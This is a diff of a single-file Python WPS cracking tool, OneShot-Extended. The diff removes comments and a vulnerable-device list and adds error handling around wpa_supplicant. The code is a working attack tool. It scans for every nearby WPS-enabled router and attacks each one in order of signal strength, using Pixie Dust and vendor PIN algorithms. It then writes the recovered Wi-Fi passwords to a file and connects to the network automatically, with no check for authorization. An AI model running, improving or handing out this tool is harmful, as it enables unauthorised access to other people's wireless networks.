@@ -1,37 +1,4 @@
-#!/usr/bin/env python3
-#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
-#  Copyright (C) 2026 chkndrp
-#
-#  This program is free software; you can redistribute it and/or
-#  modify it under the terms of the GNU General Public License
-#  as published by the Free Software Foundation; either version 2
-#  of the License, or (at your option) any later version.
-#
-#  This program is distributed in the hope that it will be useful,
-#  but WITHOUT ANY WARRANTY; without even the implied warranty of
-#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#  GNU General Public License for more details.
 
-"""OneShot-Extended — single-file build.
-
-Usage:
-    sudo python3 oneshot.py
-    sudo python3 oneshot.py -c
-
-Without arguments the script performs the whole workflow by itself: the
-interface and every working directory are detected automatically.
-
-    1. pick the wireless interface and bring it up
-    2. scan the neighbourhood and keep every WPS-capable AP, with its BSSID
-       and signal level, in a variable
-    3. walk that list from the strongest signal (highest dBm) to the weakest
-       and run the WPS attack against each BSSID
-    4. as soon as a WPA PSK comes back, keep it in a variable and hand it to
-       the OS wifi stack to actually connect
-
-``-c`` skips all of that and connects right away using the first SSID and
-password already stored in wifipassword.txt.
-"""
 
 import codecs
 import logging
@@ -58,21 +25,6 @@ from pathlib import Path
 from shutil import which
 
 def _resolve_user_home() -> str:
-    """
-    Pick a writable data root for the .OneShot-Extended directory.
-
-    Order of preference:
-
-    1. $OSE_HOME — an explicit override, set by the Android wrapper.
-    2. $HOME, but only when it points somewhere other than the filesystem
-       root. On Android the wrapper runs the script through `su`, which does
-       not carry HOME; CPython then falls back to a pwd lookup that also
-       fails and Path.home() degrades to '/'. Using that would make the data
-       directory '//.OneShot-Extended' and makedirs() would abort with
-       "Read-only file system" — the exact crash this guards against.
-    3. A directory beside the script itself, which is always writable
-       because the script could not have been read otherwise.
-    """
 
     override = os.environ.get('OSE_HOME')
     if override:
@@ -84,7 +36,6 @@ def _resolve_user_home() -> str:
 
     return os.path.dirname(os.path.abspath(__file__))
 
-
 USER_HOME = _resolve_user_home()
 SESSIONS_DIR = f'{USER_HOME}/.OneShot-Extended/sessions/'
 PIXIEWPS_DIR = f'{USER_HOME}/.OneShot-Extended/pixiewps/'
@@ -93,11 +44,9 @@ INTERFACE_CANDIDATES = (
     'wlan0', 'wlan1', 'wlp0s20f3', 'wlp3s0', 'wlx00e04c000000'
 )
 
-
 _LOGGER = None
 
 class _ColorFormatter(logging.Formatter):
-    """Custom formatter that adds colored log level prefixes"""
 
     COLORS = {
         '[*]': '\033[0;32m',
@@ -131,7 +80,6 @@ class _ColorFormatter(logging.Formatter):
         return super().format(record)
 
 def _getLogger(name: str = __name__, level: int = logging.INFO) -> logging.Logger:
-    """Get a configured logger instance"""
 
     logger = logging.getLogger(name)
 
@@ -149,14 +97,12 @@ def _getLogger(name: str = __name__, level: int = logging.INFO) -> logging.Logge
     return logger
 
 def initializeLogging():
-    """Initialize the global logging system"""
 
     global _LOGGER
 
     _LOGGER = _getLogger('ose', logging.INFO)
 
 def info(message: str):
-    """Log an info message"""
 
     if _LOGGER is None:
         initializeLogging()
@@ -164,7 +110,6 @@ def info(message: str):
     _LOGGER.info(message)
 
 def success(message: str):
-    """Log a success message (uses [+] prefix)"""
 
     if _LOGGER is None:
         initializeLogging()
@@ -172,7 +117,6 @@ def success(message: str):
     _LOGGER.info('[+] %s', message)
 
 def warning(message: str):
-    """Log a warning message"""
 
     if _LOGGER is None:
         initializeLogging()
@@ -180,32 +124,26 @@ def warning(message: str):
     _LOGGER.warning(message)
 
 def error(message: str):
-    """Log an error message"""
 
     if _LOGGER is None:
         initializeLogging()
 
     _LOGGER.error(message)
 
-
 def isAndroid():
-    """Check if this project is ran on android."""
 
     return bool(hasattr(sys, 'getandroidapilevel'))
 
 def clearScreen():
-    """Clear the terminal screen."""
 
     sys.stdout.write('\033[H\033[2J')
     sys.stdout.flush()
 
 def die(text: str):
-    """Print an error and exit with non-zero exit code."""
 
     sys.exit(f'[!] {text} \n')
 
 def _run(cmd: list, timeout: int = 15):
-    """Run a command, never raising: returns (returncode, combined output)."""
 
     try:
         result = subprocess.run(cmd,
@@ -218,7 +156,6 @@ def _run(cmd: list, timeout: int = 15):
         return 1, str(err)
 
 def ifaceCtl(interface: str, action: str):
-    """Put an interface up or down."""
 
     command = ['ip', 'link', 'set', f'{interface}', f'{action}']
 
@@ -257,7 +194,6 @@ def ifaceCtl(interface: str, action: str):
     return command_output.returncode
 
 def isInterfaceUp(interface: str) -> bool:
-    """Check if the network interface is still up."""
 
     try:
         command = ['ip', 'link', 'show', interface]
@@ -278,7 +214,6 @@ def isInterfaceUp(interface: str) -> bool:
         return False
 
 def detectInterface() -> str | None:
-    """Find the wireless interface to work on."""
 
     for candidate in INTERFACE_CANDIDATES:
         if os.path.exists(f'/sys/class/net/{candidate}'):
@@ -303,9 +238,7 @@ def detectInterface() -> str | None:
 
     return None
 
-
 def _getProcessCommand(pid: int) -> str:
-    """Get the command line of a process from /proc."""
 
     try:
         with open(f'/proc/{pid}/cmdline', 'r', encoding='utf-8') as f:
@@ -316,32 +249,19 @@ def _getProcessCommand(pid: int) -> str:
         return ''
 
 def _pixieRunPath(bssid: str) -> str:
-    """Path of the per-BSSID pixiewps scratch file (``<PIXIEWPS_DIR><MAC>.run``)."""
 
     return f'''{PIXIEWPS_DIR}{bssid.replace(':', '').upper()}.run'''
 
 class AndroidNetwork:
-    """Android Wi-Fi control: one command per direction, and nothing else.
 
-    ``svc wifi disable`` takes the radio down, ``svc wifi enable`` brings it
-    back. That is the whole class.
-
-    Everything earlier revisions layered on top — confirmation polling, scanner
-    preference juggling, background-process killing — has been removed, because
-    each layer was itself a way to make the run look wedged. The switch is
-    fire-and-forget; the attack that follows finds out immediately whether the
-    interface is actually free.
-    """
-
-    # `svc` lives in /system/bin on every Android release; `cmd` too. Naming
-    # them explicitly rather than relying on PATH means a root manager that
-    # scrubs the environment cannot break Wi-Fi control.
+    
+    
+    
     SVC = '/system/bin/svc' if os.path.exists('/system/bin/svc') else 'svc'
     CMD = '/system/bin/cmd' if os.path.exists('/system/bin/cmd') else 'cmd'
 
     @staticmethod
     def _shell(args: list, timeout: int = 20):
-        """Run a shell command, returning ``(ok, combined_output)``."""
 
         try:
             result = subprocess.run(args,
@@ -357,15 +277,6 @@ class AndroidNetwork:
 
     @staticmethod
     def _runSvc(args: list, timeout: int = 20):
-        """Run ``svc <args>`` — the native radio switch.
-
-        The script is already uid 0, so the normal path is a direct exec. The
-        ``su`` escalation is attempted once, only when the direct call fails and
-        we are not already root. A swallowed ``svc`` failure is what used to
-        leave the radio up while the script believed it was down, so the exit
-        status and raw output are returned to the caller rather than folded
-        into a generic "did it work".
-        """
 
         command = [AndroidNetwork.SVC] + args
         label = ' '.join(command)
@@ -385,7 +296,6 @@ class AndroidNetwork:
         return ok_su, (output_su or output), label
 
     def disableWifi(self, force_disable: bool = False, whisper: bool = False):
-        """Turn Wi-Fi off with the one command that does it, then return."""
 
         if whisper is False:
             info('[*] Android: disabling Wi-Fi')
@@ -398,7 +308,6 @@ class AndroidNetwork:
         return ok
 
     def enableWifi(self, force_enable: bool = False, whisper: bool = False):
-        """Turn Wi-Fi back on with the one command that does it, then return."""
 
         if whisper is False:
             info('[*] Android: enabling Wi-Fi')
@@ -411,34 +320,11 @@ class AndroidNetwork:
         return ok
 
 class CredentialStore:
-    """Reads and writes the recovered credentials.
-
-    Everything lands in one human-readable file next to this script::
-
-        wifi名称:test
-        wifi密码:12345678
-
-        wifi名称:MyHome-5G
-        wifi密码:p@ssw0rd!
-
-        wifi名称:咖啡馆WiFi
-        wifi密码:helloworld
-
-    No date, no BSSID, no quotes, one blank line between groups. The file is
-    only ever appended to, so several runs accumulate in the same place and the
-    contents can be echoed straight to the terminal.
-    """
 
     PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wifipassword.txt')
 
     @staticmethod
     def read() -> list:
-        """Return every stored pair as ``(index, essid, psk)``.
-
-        The file is a flat sequence of ``wifi名称:`` / ``wifi密码:`` pairs, so it
-        is parsed positionally: line 1 is the name, line 2 the password, then a
-        blank separator.
-        """
 
         pairs = []
 
@@ -464,7 +350,7 @@ class CredentialStore:
             if ':' not in line:
                 continue
 
-            # Split once only: a password may legitimately contain ':'
+            
             key, _, value = line.partition(':')
             key = key.strip()
             value = value.strip()
@@ -481,13 +367,11 @@ class CredentialStore:
 
     @staticmethod
     def knownBssids() -> list:
-        """Return the saved networks so the scan table can flag them."""
 
         return [('<unknown>', essid) for essid, _psk in CredentialStore.read()]
 
     @staticmethod
     def isKnown(essid: str, psk: str) -> bool:
-        """True when this exact SSID/PSK pair is already stored."""
 
         target = ((essid or '').strip('\'"'), (psk or '').strip('\'"'))
 
@@ -495,7 +379,6 @@ class CredentialStore:
 
     @staticmethod
     def append(bssid: str, essid: str, wps_pin: str, wpa_psk: str) -> bool:
-        """Append one credential group. Returns False when it was a duplicate."""
 
         essid = (essid or '').strip('\'"')
         wpa_psk = (wpa_psk or '').strip('\'"')
@@ -517,7 +400,6 @@ class CredentialStore:
 
     @staticmethod
     def echo():
-        """Print the stored credentials to the terminal."""
 
         if not os.path.exists(CredentialStore.PATH):
             info('No credentials stored yet')
@@ -530,28 +412,14 @@ class CredentialStore:
         else:
             warning(f'Could not read {CredentialStore.PATH}')
 
-
 class WiFiScanner:
-    """Handles parsing scan results and auto target selection."""
 
-    def __init__(self, interface: str, vuln_list: list = None):
+    def __init__(self, interface: str):
         self.INTERFACE = interface
-        self.VULN_LIST = vuln_list
 
         self.STORED = CredentialStore.knownBssids()
 
     def scanTargets(self, attempts: int = 4) -> list:
-        """Scan the neighbourhood without asking anything, strongest signal first.
-
-        Returns a list of ``(BSSID, network_info)`` tuples. ``network_info`` holds
-        the full WPS record for that AP, ``Level`` (dBm) included. The list is
-        sorted by descending signal level, so the closest AP is tried first.
-
-        ``iw scan`` regularly fails with 'Device or resource busy (-16)' when the
-        interface is still settling down or another process is scanning, so the
-        scan is retried a few times with increasing pauses instead of giving up
-        on the first failure.
-        """
 
         networks = None
 
@@ -567,8 +435,8 @@ class WiFiScanner:
                         f'retrying in {pause}s')
                 time.sleep(pause)
 
-                # Give the interface a nudge: a down/up cycle clears the
-                # 'resource busy' state left over by a previous scan or supplicant
+                
+                
                 ifaceCtl(self.INTERFACE, action='down')
                 time.sleep(1)
                 ifaceCtl(self.INTERFACE, action='up')
@@ -584,7 +452,6 @@ class WiFiScanner:
         return [(entry['BSSID'], entry) for entry in targets]
 
     def iwScanner(self) -> dict | bool:
-        """Parsing iw scan results."""
 
         def handleNetwork(_line, result, networks):
             networks.append(
@@ -721,12 +588,10 @@ class WiFiScanner:
         return network_list
 
     def _printNetworkTable(self, network_list: dict):
-        """Print the discovered networks, strongest first."""
 
         network_list_items = list(network_list.items())
 
         def truncateStr(s: str | None, length: int, postfix='…') -> str:
-            """Truncate string with the specified length."""
 
             if len(s) > length:
                 k = length - len(postfix)
@@ -734,7 +599,6 @@ class WiFiScanner:
             return s
 
         def colored(text: str, color: str) -> str:
-            """Returns colored text"""
 
             if color:
                 if color == 'green':
@@ -760,7 +624,6 @@ class WiFiScanner:
         ))
 
         def entryMaxLength(item: str, max_length=27) -> int:
-            """Calculates max length of network_list_items entry"""
 
             lengths = [len(entry[1].get(item, '')) for entry in network_list_items]
             return min(max(lengths), max_length) + 1
@@ -798,22 +661,13 @@ class WiFiScanner:
                 print(colored(line, color='dark_green'))
             elif network['WPS locked']:
                 print(colored(line, color='red'))
-            elif self.VULN_LIST and (model in self.VULN_LIST) or (device_name in self.VULN_LIST):
-                print(colored(line, color='green'))
             else:
                 print(line)
 
-
 class WiFiCollector:
-    """Allows for collecting result, pin or network."""
 
     @staticmethod
     def writeResult(bssid: str, essid: str, wps_pin: str, wpa_psk: str):
-        """Append the recovered credentials to wifipassword.txt.
-
-        Written as a ``wifi名称:`` / ``wifi密码:`` pair (in Chinese, as asked)
-        with a blank line after each group, right next to this script.
-        """
 
         if not CredentialStore.append(bssid, essid, wps_pin, wpa_psk):
             return info(f'[*] Credentials for {essid} ({bssid}) are already saved.')
@@ -822,7 +676,6 @@ class WiFiCollector:
 
     @staticmethod
     def writePin(bssid: str, pin: str):
-        """Writes PIN to a file for later use."""
 
         filename = _pixieRunPath(bssid)
 
@@ -831,9 +684,7 @@ class WiFiCollector:
 
         info(f'[*] PIN saved in {filename}')
 
-
 class NetworkAddress:
-    """Handles MAC addresses"""
 
     def __init__(self, mac):
         if isinstance(mac, int):
@@ -845,12 +696,10 @@ class NetworkAddress:
 
     @staticmethod
     def _mac2int(mac) -> int:
-        """Converts MAC address to integer"""
         return int(mac.replace(':', ''), 16)
 
     @staticmethod
     def _int2mac(mac) -> str:
-        """Converts integer to MAC address"""
         mac = hex(mac).split('x')[-1].upper()
         mac = mac.zfill(12)
         mac = ':'.join(mac[i: i + 2] for i in range(0, 12, 2))
@@ -902,7 +751,6 @@ class NetworkAddress:
         return f'NetworkAddress(string={self._STR_REPR}, integer={self._INT_REPR})'
 
 class WPSpin:
-    """WPS pin generator."""
 
     def __init__(self):
         self.ALGO_MAC = 0
@@ -941,7 +789,6 @@ class WPSpin:
                       'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
 
     def getLikely(self, bssid: str):
-        """Returns a likely pin."""
 
         res = self._getSuggestedList(bssid)
         if res:
@@ -951,7 +798,6 @@ class WPSpin:
 
     @staticmethod
     def checksum(pin: int) -> int:
-        """Standard WPS checksum algorithm."""
 
         accum = 0
         while pin:
@@ -963,7 +809,6 @@ class WPSpin:
 
     @staticmethod
     def _suggest(bssid: str) -> list:
-        """Get algo suggestions for a BSSID."""
 
         mac = bssid.replace(':', '').upper()
         algorithms = {
@@ -1059,7 +904,6 @@ class WPSpin:
         return self._pinDLink(bssid)
 
     def _generate(self, algo: str, bssid: str):
-        """WPS pin generator."""
 
         mac = NetworkAddress(bssid)
         if algo not in self.ALGOS:
@@ -1075,7 +919,6 @@ class WPSpin:
         return pin.zfill(8)
 
     def _getSuggestedList(self, bssid: str):
-        """Get all suggested WPS pin's for single MAC as list."""
 
         res = []
         for algo in self._suggest(bssid):
@@ -1083,9 +926,7 @@ class WPSpin:
 
         return res
 
-
 class PixieData:
-    """Stored data used for pixiewps command."""
 
     def __init__(self):
         self.PKE = ''
@@ -1098,12 +939,10 @@ class PixieData:
         self.BSSID = ''
 
     def getAll(self):
-        """Output all pixiewps related variables."""
 
         return all([self.PKE, self.PKR, self.E_NONCE, self.R_NONCE, self.AUTHKEY, self.E_HASH1, self.E_HASH2, self.BSSID])
 
     def runPixieWps(self, show_command: bool = False, full_range: bool = False):
-        """Runs the pixiewps and attempts to extract the WPS pin from the output."""
 
         info('Running Pixiewps…')
         command = self._getPixieCmd(full_range)
@@ -1136,7 +975,6 @@ class PixieData:
         return False
 
     def _getPixieCmd(self, full_range: bool = False):
-        """Generates a list representing the command for the pixiewps tool."""
 
         pixiecmd = ['pixiewps']
         pixiecmd.extend([
@@ -1158,12 +996,9 @@ class PixieData:
         return pixiecmd
 
     def clear(self):
-        """Resets the pixiewps variables."""
         self.__init__()
 
-
 class ConnectionStatus:
-    """Stores WPS connection details and status."""
 
     def __init__(self):
         self.STATUS = ''
@@ -1174,11 +1009,9 @@ class ConnectionStatus:
         self.IS_LOCKED = False
 
     def clear(self):
-        """Resets the connection status variables."""
         self.__init__()
 
 class WPSConnection:
-    """WPS connection"""
 
     def __init__(self, interface: str):
         self.INTERFACE = interface
@@ -1193,24 +1026,26 @@ class WPSConnection:
             self.TEMPCONF = temp.name
 
         self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
-        self._initWpaSupplicant()
 
         self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
         self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
         self.RETSOCK.bind(self.RES_SOCKET_FILE)
 
+        
+        
+        
+        self.SUPP_UP = self._initWpaSupplicant()
+
         self.DISCONNECT_COUNT = 0
 
     @staticmethod
     def _getHex(line: str) -> str:
-        """Filters WPA Supplicant output, and removes whitespaces"""
 
         a = line.split(':', 3)
         return a[2].replace(' ', '').upper()
 
     @staticmethod
     def _explainWpasNotOkStatus(command: str, respond: str):
-        """Outputs details about WPA supplicant errors"""
 
         if command.startswith(('WPS_REG', 'WPS_PBC')):
             if respond == 'UNKNOWN COMMAND':
@@ -1220,18 +1055,12 @@ class WPSConnection:
 
     @staticmethod
     def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
-        """Prints network credentials after success"""
 
         success(f'WPS PIN: \'{wps_pin}\'')
         success(f'WPA PSK: \'{wpa_psk}\'')
         success(f'AP SSID: \'{essid}\'')
 
     def singleConnection(self, bssid: str = None, pin: str = None) -> bool:
-        """
-        Establish a WPS connection, using a calculated pin (if in pixiemode), a
-        PIN generated from a list of likely PINs, or a null pin. Handles
-        pixiedust attacks if enabled and manages storing PINs on connection failure
-        """
 
         generator    = WPSpin()
         collector    = WiFiCollector()
@@ -1272,8 +1101,7 @@ class WPSConnection:
         collector.writePin(bssid, pin)
         return False
 
-    def _initWpaSupplicant(self):
-        """Initializes wpa_supplicant with the specified configuration"""
+    def _initWpaSupplicant(self) -> bool:
 
         info('Running wpa_supplicant…')
 
@@ -1292,7 +1120,7 @@ class WPSConnection:
             )
         except (subprocess.CalledProcessError, FileNotFoundError) as err:
             error(f'Failed to open wpa_supplicant \n {err}')
-            return
+            return False
 
         deadline = time.time() + WPS_STATE_TIMEOUT
 
@@ -1301,9 +1129,9 @@ class WPSConnection:
 
             if ret is not None and ret != 0:
                 error(f'wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
-                return
+                return False
             if os.path.exists(self.WPAS_CTRL_PATH):
-                break
+                return True
 
             if time.time() > deadline:
                 error('wpa_supplicant control interface never appeared — aborting attempt')
@@ -1312,20 +1140,32 @@ class WPSConnection:
                     self.WPAS.terminate()
                 except OSError:
                     pass
-                return
+                return False
 
             time.sleep(.1)
 
-    def _sendAndReceive(self, command: str) -> str:
-        """Sends command to wpa_supplicant and returns the reply.
+    def _controlSocketReady(self) -> bool:
 
-        ``recvfrom()`` waits forever for an answer that a wedged supplicant may
-        never send, so the socket gets a timeout and a missing reply is reported
-        as 'TIMEOUT' rather than killing the flow.
-        """
+        return os.path.exists(self.WPAS_CTRL_PATH)
+
+    def _sendAndReceive(self, command: str) -> str:
+
+        
+        
+        if not self._controlSocketReady():
+            warning(f'wpa_supplicant control socket is gone — '
+                    f'cannot send \'{command}\'')
+            self.CONNECTION_STATUS.STATUS = 'STALLED'
+            return 'TIMEOUT'
 
         self.RETSOCK.settimeout(WPS_STATE_TIMEOUT)
-        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
+
+        try:
+            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
+        except OSError as err:
+            warning(f'Control socket send failed for \'{command}\': {err}')
+            self.CONNECTION_STATUS.STATUS = 'STALLED'
+            return 'TIMEOUT'
 
         try:
             (b, _address) = self.RETSOCK.recvfrom(4096)
@@ -1340,19 +1180,18 @@ class WPSConnection:
         return inmsg
 
     def _sendOnly(self, command: str):
-        """Sends command to wpa_supplicant without reply"""
 
-        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
+        if not self._controlSocketReady():
+            self.CONNECTION_STATUS.STATUS = 'STALLED'
+            return
+
+        try:
+            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
+        except OSError as err:
+            warning(f'Control socket send failed for \'{command}\': {err}')
+            self.CONNECTION_STATUS.STATUS = 'STALLED'
 
     def _handleWpas(self, timeout: float = None) -> bool:
-        """Handles WPA supplicant output and updates connection status.
-
-        ``readline()`` blocks forever while the supplicant is stuck in its own
-        Scanning/Associating retry loop, which is exactly how a single AP can
-        eat the whole run. Poll the pipe with select() instead and give up on
-        this frame once ``timeout`` seconds pass, so the caller can move on to
-        the next AP.
-        """
 
         if timeout is None:
             timeout = WPS_STATE_TIMEOUT
@@ -1383,7 +1222,6 @@ class WPSConnection:
         return self._handle_connection_states(line)
 
     def _handle_wps_messages(self, line: str) -> bool:
-        """Handle WPS-specific protocol messages"""
 
         if 'M2D' in line:
             warning('Received WPS Message M2D')
@@ -1444,7 +1282,6 @@ class WPSConnection:
         return True
 
     def _handle_connection_states(self, line: str) -> bool:
-        """Handle various connection state changes"""
 
         if ': State: ' in line and '-> SCANNING' in line:
             self.CONNECTION_STATUS.STATUS = 'scanning'
@@ -1498,7 +1335,6 @@ class WPSConnection:
         return True
 
     def _handle_pixie_data(self, attr: str, line: str, expected_len: int):
-        """Handle pixie dust attack related data"""
         hex_value = self._getHex(line)
         if len(hex_value) != expected_len:
             raise ValueError(f'Invalid {attr} length: expected {expected_len}, got {len(hex_value)}')
@@ -1508,19 +1344,12 @@ class WPSConnection:
             info(f'{attr}: {hex_value}')
 
     def _decode_essid(self, line: str) -> str:
-        """Decode ESSID from wpa_supplicant output"""
         return codecs.decode(
             '\''.join(line.split('\'')[1:-1]),
             'unicode-escape'
         ).encode('latin1').decode('utf-8', errors='replace')
 
     def _drainPipe(self, linger: float = 0.5):
-        """Discard leftovers from the previous attempt without ever blocking.
-
-        A plain ``stdout.read(300)`` blocks until 300 bytes are available, which
-        freezes the run on a chatty-but-short wpa_supplicant. Poll with select()
-        instead, and stop as soon as nothing new arrives.
-        """
 
         if not self.WPAS.stdout:
             return
@@ -1539,7 +1368,11 @@ class WPSConnection:
 
     def _wpsConnection(self, bssid: str = None, pin: str = None,
         retry_on_lock: bool = False) -> bool:
-        """Handles WPS connection process"""
+
+        if not self.SUPP_UP:
+            error('wpa_supplicant is not running — skipping this AP')
+            self.CONNECTION_STATUS.STATUS = 'STALLED'
+            return False
 
         while True:
             self.PIXIE_CREDS.clear()
@@ -1567,8 +1400,8 @@ class WPSConnection:
                     self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                     break
 
-                # Whole-attempt watchdog: no matter which state the supplicant
-                # is stuck in, stop feeding this AP once the budget is gone.
+                
+                
                 elapsed = time.time() - wps_start_time
 
                 if elapsed > WPS_ATTEMPT_TIMEOUT:
@@ -1594,7 +1427,13 @@ class WPSConnection:
                     except subprocess.TimeoutExpired:
                         self.WPAS.kill()
 
-                    self._initWpaSupplicant()
+                    
+                    
+                    self.SUPP_UP = self._initWpaSupplicant()
+                    if not self.SUPP_UP:
+                        error('wpa_supplicant did not come back up — skipping this AP')
+                        return False
+
                     time.sleep(1)
 
                     r = self._sendAndReceive(cmd)
@@ -1618,13 +1457,6 @@ class WPSConnection:
             return self.CONNECTION_STATUS.STATUS == 'GOT_PSK'
 
     def _resetSupplicant(self):
-        """Restart wpa_supplicant so the next AP gets a clean WPS exchange.
-
-        After a successful crack the supplicant stays associated to the AP we
-        just recovered; a fresh ``WPS_REG`` against that state is unreliable.
-        Terminate the old process and start a new one, exactly as the
-        WPS-timeout path already does.
-        """
 
         try:
             if hasattr(self, 'WPAS'):
@@ -1636,11 +1468,12 @@ class WPSConnection:
             except OSError:
                 pass
 
-        self._initWpaSupplicant()
+        self.SUPP_UP = self._initWpaSupplicant()
+        if not self.SUPP_UP:
+            error('wpa_supplicant did not come back up after reset')
         time.sleep(1)
 
     def _cleanup(self):
-        """Terminates connections and removes temporary files"""
 
         try:
             self.RETSOCK.close()
@@ -1664,14 +1497,7 @@ class WPSConnection:
     def __del__(self):
         self._cleanup()
 
-
 def connectToNetwork(interface: str, essid: str, psk: str, bssid: str = None) -> bool:
-    """Connect the interface to an AP using the PSK we just recovered.
-
-    Tries, in order, whatever is actually installed on the box:
-    ``wmcli``/NetworkManager, plain ``wpa_supplicant``, or Android's ``cmd wifi``.
-    Returns True on success.
-    """
 
     if not essid or essid == '<hidden>':
         error('No ESSID available, cannot connect')
@@ -1688,7 +1514,6 @@ def connectToNetwork(interface: str, essid: str, psk: str, bssid: str = None) ->
     return _connectWpaSupplicant(interface, essid, psk, bssid)
 
 def _connectNetworkManager(interface: str, essid: str, psk: str, bssid: str = None) -> bool:
-    """Connect through NetworkManager."""
 
     _run(['nmcli', 'connection', 'delete', essid])
 
@@ -1707,7 +1532,6 @@ def _connectNetworkManager(interface: str, essid: str, psk: str, bssid: str = No
     return False
 
 def _connectWpaSupplicant(interface: str, essid: str, psk: str, bssid: str = None) -> bool:
-    """Connect using a throw-away wpa_supplicant config + dhclient/udhcpc."""
 
     if not which('wpa_supplicant'):
         error('Neither NetworkManager nor wpa_supplicant is available')
@@ -1742,8 +1566,8 @@ def _connectWpaSupplicant(interface: str, essid: str, psk: str, bssid: str = Non
         _run(['wpa_cli', '-i', interface, 'terminate'])
         time.sleep(1)
 
-        # -B makes wpa_supplicant daemonize, so the parent exits right away:
-        # never wait() without expecting a TimeoutExpired.
+        
+        
         wpa_process = subprocess.Popen(
             ['wpa_supplicant', '-B', f'-i{interface}', f'-c{conf_path}'],
             stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
@@ -1771,7 +1595,6 @@ def _connectWpaSupplicant(interface: str, essid: str, psk: str, bssid: str = Non
             os.remove(conf_path)
 
 def _renewDhcpLease(interface: str):
-    """Ask for an IP address once the association is up."""
 
     for tool, cmd in (
         ('dhclient', ['dhclient', '-v', interface]),
@@ -1786,16 +1609,6 @@ def _renewDhcpLease(interface: str):
     warning('No DHCP client found — interface is associated without an address')
 
 def _connectAndroid(essid: str, psk: str) -> bool:
-    """Connect through the Android wifi service.
-
-    Unlike :meth:`AndroidNetwork.enableWifi`, this one has to *leave* Wi-Fi on
-    and then join a network, so it cannot delegate to the class — but it uses
-    the same command family and, importantly, the same ``subprocess`` shape.
-    The previous version called ``_run()`` with a list plus ``encoding=``/
-    ``stdout=`` keyword arguments, which ``_run`` did not accept; the resulting
-    ``TypeError`` made every ``-c`` run fall through to the wpa_supplicant path
-    instead of the service.
-    """
 
     ok_enable, output_enable, _ = AndroidNetwork._runSvc(['wifi', 'enable'])
 
@@ -1812,51 +1625,6 @@ def _connectAndroid(essid: str, psk: str) -> bool:
     error(f'Android wifi service could not connect: {output}')
     return False
 
-
-def loadVulnList() -> list:
-    """Return the known-vulnerable devices for this run.
-
-    Nothing is read from or written to disk, so no vulnwsc.txt is ever created.
-    """
-
-    return list(_VULNERABLE_DEVICES)
-
-def addVulnerableAP(network_info: dict):
-    """Remember a vulnerable device model/name for this run.
-
-    Kept in memory only: nothing is written to disk, so no vulnwsc.txt is
-    created next to the script.
-    """
-
-    if not network_info:
-        return
-
-    model = network_info.get('Model', '').strip()
-    model_number = network_info.get('Model number', '').strip()
-    device_name = network_info.get('Device name', '').strip()
-
-    vuln_entry = None
-
-    if model:
-        vuln_entry = f'{model} {model_number}'.strip() if model_number else model
-    elif device_name:
-        vuln_entry = device_name
-
-    if not vuln_entry:
-        warning('No model or device name information available to save')
-        return
-
-    if vuln_entry in _VULNERABLE_DEVICES:
-        info(f'Device {vuln_entry} is already in the vulnerable list')
-        return
-
-    _VULNERABLE_DEVICES.append(vuln_entry)
-    info(f'Added {vuln_entry} to vulnerable list')
-
-
-_VULNERABLE_DEVICES = []
-
-
 PIXIE_DUST    = True
 PIXIE_FORCE   = False
 SHOW_PIXIE    = False
@@ -1865,25 +1633,19 @@ IFACE_DOWN    = False
 MTK_WIFI      = False
 ANDROID_SETTINGS = True
 
-# Timeout guard: an AP that gets stuck in its own Scanning/Associating retry
-# loop would otherwise stall the whole run on a single target.
-# WPS_STATE_TIMEOUT is how long we wait for one line of supplicant output,
-# WPS_ATTEMPT_TIMEOUT is the total budget for one BSSID before moving on.
+MODE2         = False
+
 WPS_STATE_TIMEOUT   = 10
 WPS_ATTEMPT_TIMEOUT = 10
 
-def androidWifiManaged() -> bool:
-    """Whether this run is responsible for taking Android's Wi-Fi down and back up.
+CONNECT_SSID = ''
+CONNECT_PSK  = ''
 
-    True only on Android, with the setting enabled, and when the MediaTek Wi-Fi
-    device path is not in use (that one is handled separately).
-    """
+def androidWifiManaged() -> bool:
 
     return isAndroid() and ANDROID_SETTINGS and not MTK_WIFI
 
-
 def checkRequirements():
-    """Verify requirements are met"""
 
     required_binaries = [
         'pixiewps',
@@ -1899,12 +1661,11 @@ def checkRequirements():
         die('Run it as root')
 
 def setupDirectories():
-    """Create required directories"""
 
-    # expanduser('~') is only trustworthy when HOME is meaningful. On Android
-    # it can collapse to '/' — see _resolve_user_home() — which would make the
-    # legacy-migration check below look at a path nothing can ever write to,
-    # so it is pinned to the resolved home instead.
+    
+    
+    
+    
     old_dir = f'{USER_HOME}/.OSE'
     new_dir = f'{USER_HOME}/.OneShot-Extended'
 
@@ -1920,14 +1681,13 @@ def setupDirectories():
             try:
                 os.makedirs(directory)
             except OSError as err:
-                # Report where it tried and why, rather than dying with a bare
-                # traceback that gives no hint about which base was used.
+                
+                
                 die(f'Cannot create {directory}: {err}\n'
                     f'    data root resolved to: {USER_HOME}\n'
                     f'    set OSE_HOME to a writable directory to override')
 
 def setupAndroidWifi(android_network: AndroidNetwork, enable: bool = False) -> bool:
-    """Throw the Android Wi-Fi switch, one way or the other."""
 
     if enable:
         return android_network.enableWifi()
@@ -1935,7 +1695,6 @@ def setupAndroidWifi(android_network: AndroidNetwork, enable: bool = False) -> b
     return android_network.disableWifi()
 
 def setupMediatekWifi(wmt_wifi_device: Path):
-    """Initialize MediaTek WiFi dev"""
 
     if not wmt_wifi_device.is_char_device():
         die('Unable to activate MediaTek Wi-Fi interface device: '
@@ -1944,26 +1703,18 @@ def setupMediatekWifi(wmt_wifi_device: Path):
     wmt_wifi_device.chmod(0o644)
     wmt_wifi_device.write_text('1', encoding='utf-8')
 
